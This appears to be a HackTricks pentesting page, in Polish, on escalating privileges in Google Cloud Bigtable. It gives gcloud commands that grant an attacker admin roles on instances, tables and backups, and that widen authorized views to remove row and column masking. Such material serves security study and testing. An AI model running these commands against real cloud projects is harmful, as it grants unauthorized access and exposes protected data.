# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Aby uzyskać więcej informacji o Bigtable, sprawdź:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**Permissions:** `bigtable.instances.setIamPolicy` (i zwykle `bigtable.instances.getIamPolicy` do odczytu bieżących powiązań).

Posiadanie polityki IAM instancji pozwala przyznać sobie **`roles/bigtable.admin`** (lub dowolną rolę niestandardową), która kaskaduje do każdego klastra, tabeli, kopii zapasowej i autoryzowanego widoku w instancji.

<details><summary>Przyznaj sobie rolę bigtable.admin na instancji</summary>
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

> [!TIP]
> Jeśli nie możesz wylistować istniejących powiązań, przygotuj nowy dokument polityki i zastosuj go za pomocą `gcloud bigtable instances set-iam-policy`, pod warunkiem, że zachowasz w nim swoje uprawnienia.

Po uzyskaniu tego uprawnienia sprawdź w sekcji [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) techniki, aby znaleźć więcej sposobów nadużycia uprawnień Bigtable.

### `bigtable.tables.setIamPolicy`

**Uprawnienia:** `bigtable.tables.setIamPolicy` (opcjonalnie `bigtable.tables.getIamPolicy`).

Polityki instancji mogą być zablokowane, podczas gdy poszczególne tabele są delegowane. Jeśli możesz edytować IAM tabeli, możesz **przyznać sobie rolę właściciela docelowego zbioru danych** bez ingerencji w inne obciążenia.

<details><summary>Przyznaj sobie rolę bigtable.admin na tabeli</summary>
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Po uzyskaniu tego uprawnienia sprawdź w [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) techniki pokazujące więcej sposobów nadużywania uprawnień Bigtable.


### `bigtable.backups.setIamPolicy`

**Uprawnienia:** `bigtable.backups.setIamPolicy`

Kopie zapasowe można przywrócić do **dowolnej instancji w dowolnym projekcie**, którymi zarządzasz. Najpierw przyznaj swojej tożsamości dostęp do backupu, a następnie przywróć go do sandboxa, w którym masz role Admin/Owner.

Jeśli masz uprawnienie `bigtable.backups.setIamPolicy`, możesz przyznać sobie uprawnienie `bigtable.backups.restore`, aby przywrócić stare kopie zapasowe i spróbować uzyskać dostęp do wrażliwych informacji.

<details><summary>Take ownership of backup snapshot</summary>
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Po uzyskaniu tego uprawnienia sprawdź [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md), aby zobaczyć, jak przywrócić kopię zapasową.


### Aktualizuj authorized view

**Uprawnienia:** `bigtable.authorizedViews.update`

Authorized Views mają na celu maskować wiersze/kolumny. Modyfikacja lub usunięcie ich **usuwa drobnoziarniste zabezpieczenia**, na których polegają obrońcy.

<details><summary>Zaktualizuj authorized view, aby poszerzyć dostęp</summary>
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
</details>

Po uzyskaniu tego uprawnienia sprawdź w [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md), jak odczytać z Authorized View.

### `bigtable.authorizedViews.setIamPolicy`

**Uprawnienia:**  `bigtable.authorizedViews.setIamPolicy`.

Atakujący posiadający to uprawnienie może przyznać sobie dostęp do Authorized View, które może zawierać poufne dane, do których w innym przypadku nie miałby dostępu.

<details><summary>Przyznaj sobie dostęp do Authorized View</summary>
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
</details>

Po sprawdzeniu uprawnień zobacz w [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md), jak odczytywać z autoryzowanego widoku.



{{#include ../../../banners/hacktricks-training.md}}
